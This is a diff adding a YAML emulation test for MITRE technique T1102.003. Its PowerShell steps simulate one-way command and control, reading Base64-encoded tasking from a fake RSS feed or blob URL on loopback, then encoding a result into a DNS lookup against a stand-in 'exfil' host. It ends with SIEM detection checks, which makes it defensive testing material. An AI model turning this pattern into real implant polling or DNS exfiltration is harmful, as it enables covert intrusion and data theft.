@@ -1,0 +1,121 @@
+id: T1102.003_web_service_one_way
+name: "Web Service — One-Way Communication"
+mitre_technique: "T1102.003"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries use a legitimate web service to deliver commands to implants in one
+  direction only — the implant reads commands from the service but sends results
+  back via a separate, different channel (or not at all for fire-and-forget tasks).
+  This asymmetric pattern makes detection harder because no single service shows
+  both command delivery and result retrieval. Common patterns: commands posted to
+  a public RSS feed, Twitter/X timeline, or cloud storage bucket; results sent
+  back via DNS exfiltration or ICMP to avoid correlating the two channels.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1102/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1102.003 — One-Way Web Service C2 simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate RSS feed C2 — implant polls RSS for encoded commands"
+    command: |
+      Write-Host "[PAS] RSS feed one-way C2 pattern:"
+      Write-Host "[PAS] Adversary posts encoded command as RSS item description"
+      Write-Host "[PAS] Implant polls feed, extracts command — results via separate channel"
+
+      # Simulate RSS fetch (loopback)
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/feed.rss")
+          $req.Accept  = "application/rss+xml"
+          $req.Timeout = 500
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] RSS feed fetch telemetry generated"
+
+      # Simulate XML parsing of RSS response for embedded command
+      $simulatedRss = @"
+<?xml version="1.0"?>
+<rss version="2.0"><channel><title>News</title>
+<item><title>Update</title>
+<description>Today's news: d2hvYW1p</description></item>
+</channel></rss>
+"@
+      # Extract Base64 from description
+      $b64Match = [regex]::Match($simulatedRss, '<description>[^<]*([A-Za-z0-9+/]{8,}={0,2})[^<]*</description>')
+      if ($b64Match.Success) {
+          $decoded = [Text.Encoding]::UTF8.GetString(
+              [Convert]::FromBase64String($b64Match.Groups[1].Value))
+          Write-Host "[PAS] Extracted command from RSS description: $decoded"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate cloud storage one-way C2 — command file read from S3/Blob"
+    command: |
+      Write-Host "[PAS] Cloud storage one-way C2 pattern:"
+      Write-Host "[PAS] Adversary uploads command file to public S3 bucket or Azure Blob"
+      Write-Host "[PAS] Implant polls storage URL for new command file"
+
+      try {
+          # Simulate Azure Blob Storage fetch (loopback)
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/pas-c2-container/tasking.json")
+          $req.Headers.Add("x-ms-version", "2020-04-08")
+          $req.Timeout = 500
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Azure Blob / S3 command fetch telemetry generated"
+      Write-Host "[PAS] Results sent back via separate channel (DNS tunnel, ICMP) — no return traffic here"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate the asymmetric pattern — read from web service, return via DNS"
+    command: |
+      Write-Host "[PAS] Asymmetric C2 pattern — in via web service, out via DNS:"
+      # Receive command: HTTP GET to web service
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/cmd" -TimeoutSec 1 `
+              -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      Write-Host "[PAS] Command received via: HTTP GET to web service"
+
+      # Return results via DNS (separate channel)
+      $result  = "whoami_output_simulated"
+      $encoded = ([System.BitConverter]::ToString(
+          [Text.Encoding]::UTF8.GetBytes($result)) -replace '-','').Substring(0,30)
+      try {
+          [System.Net.Dns]::GetHostAddresses("$encoded.exfil.pas-test.local") | Out-Null
+      } catch {}
+      Write-Host "[PAS] Results returned via: DNS exfil query"
+      Write-Host "[PAS] No single service sees both sides — correlation is difficult"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — periodic web service reads from scripting process combined with DNS exfil burst from same process"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1102.003 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Network event: powershell.exe periodically fetching from public web service (RSS, Blob storage, S3)"
+  - "Correlation: same process making web service GET requests AND DNS queries with high-entropy subdomains"
+  - "Script block logging: Base64 extraction from HTTP response body in powershell.exe"
+  - "Sentinel: correlate DeviceNetworkEvents (HTTP GET to web service) with DnsEvents (high-entropy subdomain) by same process"
+  - "MDE alert: 'Asymmetric C2 channel — read from web service, exfil via DNS'"
+  - "CONTROL CHECK: RSS and cloud storage access from endpoints should be proxied and logged — anomalous polling patterns detectable"
+  - "CONTROL CHECK: Correlate web service access with DNS exfil patterns — the combination is a strong C2 indicator even if each alone is benign"
